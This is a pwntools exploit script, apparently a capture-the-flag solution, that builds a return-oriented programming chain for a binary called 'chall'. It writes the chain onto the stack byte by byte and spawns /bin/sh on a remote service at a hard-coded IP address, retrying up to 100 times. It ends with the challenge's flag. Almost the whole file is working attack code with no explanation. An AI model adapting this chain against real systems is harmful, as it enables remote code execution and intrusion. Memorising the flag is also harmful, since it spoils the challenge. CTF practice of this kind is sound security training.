from pwn import *


elf = context.binary = ELF("chall")


# 0x484fda
# gdb.attach(p,"b *0x484fda")


# 0x00000000004224c4 : pop rax ; ret
# 0x000000000046b3e6 : pop rdi ; setne al ; ret
# 0x000000000041338f : mov rsi, rax ; ret
# 0x000000000040e0a9 : pop rdx ; or byte ptr [rax - 1], cl ; ret


pop_rax = 0x00000000004224c4
pop_rdi = 0x000000000046b3e6
mov_rsi_rax = 0x000000000041338f
pop_rdx_rax_shit = 0x000000000040e0a9
pop_rsp_rax_shit = 0x00000000004463c5
syscall = 0x4642e5



ret = 0xc00010af48

def write_byte(addr,byte):
    p.sendline("w")
    p.sendline(hex(addr))
    p.sendline(hex(byte)[2:])




def POP_RDX(val):
    return flat([
        pop_rax, elf.bss(0x5000),
        pop_rdx_rax_shit, val, 
    ])


def POP_RSI(val):
    return flat([
        pop_rax, val,
        mov_rsi_rax,
    ])

payload = flat([
    pop_rdi, 0,
    POP_RSI(0x5361c0),
    POP_RDX(0x800),
    pop_rax, 0,
    syscall,

    pop_rax, elf.bss(0x5000), 
    pop_rsp_rax_shit, 0x5361c0,
])

print(len(payload))

for i in range(100):
    try:    
        print("round",i)
        # p = process(aslr=False)
        p = remote("34.45.81.67", 16003)
        p.sendline("w")
        p.sendline(hex(0xc00010adb8))
        p.sendline(hex(len(payload) + 2)[2:])



        # gdb.attach(p,f"b *{0x4642e7}")


        for i in range(len(payload)):
            write_byte(ret + i,payload[i])



        p.sendline("A")
        p.sendline("A")
        p.recvuntil("nvalid mode.")
        
        payload = flat([
            pop_rdi, 0,
            POP_RSI(0x5361c0),
            POP_RDX(8),
            pop_rax, 0,
            syscall,


            pop_rdi, 1,
            POP_RSI(0x5361c0),
            POP_RDX(8),
            pop_rax, 1,
            syscall,



            pop_rdi, 0x5361c0,
            POP_RSI(0),
            POP_RDX(0),
            pop_rax, 0x3b,
            syscall,

        ])
        p.sendline(payload)
        p.sendline(b"/bin/sh\x00")


        p.interactive()

    except:
        p.close()
        pass

# L3AK{60_574ck_15_4lm057_pr3d1c74bl3}